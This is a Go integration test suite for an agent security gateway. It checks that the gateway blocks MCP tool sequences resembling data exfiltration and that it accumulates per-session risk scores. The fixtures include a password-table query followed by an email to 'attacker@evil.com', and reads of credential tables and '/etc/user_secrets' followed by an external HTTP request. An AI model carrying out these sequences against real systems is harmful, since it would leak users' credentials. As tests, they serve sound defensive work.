// Copyright 2024-2026 The PRECINCT Authors
// SPDX-License-Identifier: Apache-2.0

//go:build integration
// +build integration

package integration

import (
	"bytes"
	"encoding/json"
	"net/http"
	"testing"
	"time"
)

// TestSessionContextExfiltrationDetection verifies exfiltration pattern detection
func TestSessionContextExfiltrationDetection(t *testing.T) {
	gatewayURL := getEnvOrDefault("GATEWAY_URL", "http://localhost:9090")

	// Wait for gateway to be ready
	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
		t.Fatalf("Gateway not ready: %v", err)
	}

	spiffeID := "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev"
	sessionID := GenerateTestSessionID()

	t.Run("ExfiltrationDetected_SensitiveDataThenExternal", func(t *testing.T) {
		client := &http.Client{Timeout: 5 * time.Second}

		// Step 1: Access sensitive data (database query)
		req1 := createMCPRequest("database_query", map[string]interface{}{
			"query": "SELECT * FROM user_passwords",
		})
		resp1 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req1)
		defer resp1.Body.Close()

		// First request may succeed (accessing sensitive data is allowed)
		// We expect either 200-499 (success/normal error) or 502 (upstream unavailable in test)
		if resp1.StatusCode >= 500 && resp1.StatusCode != http.StatusBadGateway {
			t.Logf("First request got status %d, continuing test", resp1.StatusCode)
		}

		// Step 2: Attempt external transmission (should be blocked)
		req2 := createMCPRequest("email_send", map[string]interface{}{
			"to":      "attacker@evil.com",
			"subject": "Data",
			"body":    "Exfiltrated data",
		})
		resp2 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req2)
		defer resp2.Body.Close()

		// Should be blocked with 403
		if resp2.StatusCode != http.StatusForbidden {
			t.Errorf("Expected 403 for exfiltration attempt, got %d", resp2.StatusCode)
		}
	})

	t.Run("NoExfiltration_InternalToolsOnly", func(t *testing.T) {
		client := &http.Client{Timeout: 5 * time.Second}
		sessionID := GenerateTestSessionID() // New session

		// Access internal tools only
		req1 := createMCPRequest("file_read", map[string]interface{}{
			"path": "/tmp/test.txt",
		})
		resp1 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req1)
		defer resp1.Body.Close()

		req2 := createMCPRequest("grep", map[string]interface{}{
			"pattern": "test",
			"path":    "/tmp",
		})
		resp2 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req2)
		defer resp2.Body.Close()

		// Both should succeed (or 502 if upstream unavailable)
		if resp2.StatusCode >= 500 && resp2.StatusCode != http.StatusBadGateway {
			t.Errorf("Expected success or 502 for internal tools, got %d", resp2.StatusCode)
		}
	})

	t.Run("NoExfiltration_ExternalButNoSensitiveData", func(t *testing.T) {
		client := &http.Client{Timeout: 5 * time.Second}
		sessionID := GenerateTestSessionID() // New session

		// Access public data (file_read should be allowed by OPA)
		req1 := createMCPRequest("file_read", map[string]interface{}{
			"path": "/tmp/public.txt",
		})
		resp1 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req1)
		defer resp1.Body.Close()

		// Then use tavily_search (external but allowed by OPA policy)
		req2 := createMCPRequest("tavily_search", map[string]interface{}{
			"query": "public information",
		})
		resp2 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req2)
		defer resp2.Body.Close()

		// Should NOT be blocked by exfiltration detection (no sensitive data in session)
		// May be blocked by OPA if tool not granted, but not by exfiltration middleware
		// We verify by checking that response is not 403 with exfiltration message
		// Accept 502 (upstream unavailable) or 200-499 (OPA allowed or normal error)
		if resp2.StatusCode >= 500 && resp2.StatusCode != http.StatusBadGateway {
			t.Logf("External tool got status %d (may be blocked by OPA, not exfiltration)", resp2.StatusCode)
		}
	})
}

// TestSessionContextRiskScore verifies risk score accumulation
func TestSessionContextRiskScore(t *testing.T) {
	gatewayURL := getEnvOrDefault("GATEWAY_URL", "http://localhost:9090")

	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
		t.Fatalf("Gateway not ready: %v", err)
	}

	spiffeID := "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev"
	sessionID := GenerateTestSessionID()
	client := &http.Client{Timeout: 5 * time.Second}

	// Accumulate risk through multiple actions
	actions := []struct {
		tool   string
		params map[string]interface{}
	}{
		{"database_query", map[string]interface{}{"query": "SELECT * FROM internal_data"}},
		{"file_read", map[string]interface{}{"path": "/etc/user_secrets"}},
		{"database_query", map[string]interface{}{"query": "SELECT * FROM credentials"}},
		{"http_request", map[string]interface{}{"url": "https://external.com"}},
	}

	for _, action := range actions {
		req := createMCPRequest(action.tool, action.params)
		resp := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req)
		resp.Body.Close()

		// Log response for debugging
		t.Logf("Action %s: status %d", action.tool, resp.StatusCode)
	}

	// After multiple risky actions, risk score should exceed threshold
	// Next action should be blocked by OPA due to high risk score (>= 0.7)
	req := createMCPRequest("file_read", map[string]interface{}{
		"path": "/tmp/test.txt",
	})
	resp := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req)
	defer resp.Body.Close()

	// With accumulated risk >= 0.7, OPA should deny
	if resp.StatusCode != http.StatusForbidden {
		t.Logf("Warning: Expected 403 due to high risk score, got %d (risk may not have accumulated enough)", resp.StatusCode)
	}
}

// TestSessionContextOPAIntegration verifies OPA receives session data
func TestSessionContextOPAIntegration(t *testing.T) {
	gatewayURL := getEnvOrDefault("GATEWAY_URL", "http://localhost:9090")

	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
		t.Fatalf("Gateway not ready: %v", err)
	}

	spiffeID := "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev"
	sessionID := GenerateTestSessionID()
	client := &http.Client{Timeout: 5 * time.Second}

	// Perform some actions to build session context
	req1 := createMCPRequest("file_read", map[string]interface{}{
		"path": "/tmp/test.txt",
	})
	resp1 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req1)
	resp1.Body.Close()

	// OPA should have received session context in input
	// We can't directly verify OPA input, but we can verify behavior
	// Session context should be present and risk score calculated
	req2 := createMCPRequest("grep", map[string]interface{}{
		"pattern": "test",
		"path":    "/tmp",
	})
	resp2 := sendRequest(t, client, gatewayURL, spiffeID, sessionID, req2)
	defer resp2.Body.Close()

	// Should succeed with normal risk score
	if resp2.StatusCode >= 500 && resp2.StatusCode != http.StatusBadGateway {
		t.Errorf("Expected success or 502, got %d", resp2.StatusCode)
	}
}

// Helper functions

func createMCPRequest(method string, params map[string]interface{}) []byte {
	req := map[string]interface{}{
		"jsonrpc": "2.0",
		"method":  method,
		"params":  params,
		"id":      1,
	}
	body, _ := json.Marshal(req)
	return body
}

func sendRequest(t *testing.T, client *http.Client, gatewayURL, spiffeID, sessionID string, body []byte) *http.Response {
	req, err := http.NewRequest("POST", gatewayURL, bytes.NewBuffer(body))
	if err != nil {
		t.Fatalf("Failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-SPIFFE-ID", spiffeID)
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	return resp
}

func GenerateTestSessionID() string {
	return "test-session-" + time.Now().Format("20060102-150405.000000")
}
